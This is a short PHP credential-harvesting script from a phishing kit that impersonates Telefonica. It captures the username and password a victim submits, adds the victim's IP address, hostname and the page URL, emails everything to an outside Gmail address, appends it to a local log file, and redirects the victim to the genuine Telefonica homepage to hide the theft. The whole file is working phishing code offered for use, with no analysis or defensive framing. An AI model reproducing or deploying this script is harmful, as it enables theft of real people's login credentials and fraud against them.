<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "https://www.telefonica.com/es/home";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ Login ~~~~~~\n";
$message .= "user             : ".$_POST['user']."\n";
$message .= "pass             : ".$_POST['pass']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "~~~~~~~ ND7 ND7 ~~~~~~~\n";
$send = "aminekatim@gmail.com";
$subject = "telefonica | $ip ";
$headers = "From:telefonica<webmaster@localhost>";
mail($send,$subject,$message,$headers);
 
$file = fopen("../ww/cool.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: $back");

?>